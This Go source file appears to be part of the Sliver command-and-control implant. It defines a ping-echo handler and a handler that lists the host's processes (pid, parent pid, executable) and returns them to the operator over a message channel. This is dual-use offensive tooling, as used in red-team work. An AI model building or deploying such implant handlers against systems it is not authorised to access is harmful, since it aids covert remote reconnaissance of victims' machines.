package main

import (
	"log"
	pb "sliver/protobuf"

	"github.com/golang/protobuf/proto"
)

// ---------------- Cross-platform Handlers ----------------

func pingHandler(send chan pb.Envelope, data []byte) {
	ping := &pb.Ping{}
	err := proto.Unmarshal(data, ping)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}
	log.Printf("ping id = %s", ping.Id)
	data, _ = proto.Marshal(ping)
	envelope := pb.Envelope{
		Id:   ping.Id,
		Type: "ping",
		Data: data,
	}
	send <- envelope
}

func psHandler(send chan pb.Envelope, data []byte) {
	psListReq := &pb.ProcessListReq{}
	err := proto.Unmarshal(data, psListReq)
	if err != nil {
		log.Printf("error decoding message: %v", err)
		return
	}
	procs, err := Processes()
	if err != nil {
		log.Printf("failed to list procs %v", err)
	}

	psList := &pb.ProcessList{
		Id:        psListReq.Id,
		Processes: []*pb.Process{},
	}

	for _, proc := range procs {
		psList.Processes = append(psList.Processes, &pb.Process{
			Pid:        int32(proc.Pid()),
			Ppid:       int32(proc.PPid()),
			Executable: proc.Executable(),
		})
	}
	data, _ = proto.Marshal(psList)
	envelope := pb.Envelope{
		Id:   psListReq.Id,
		Type: "psList",
		Data: data,
	}
	send <- envelope
}
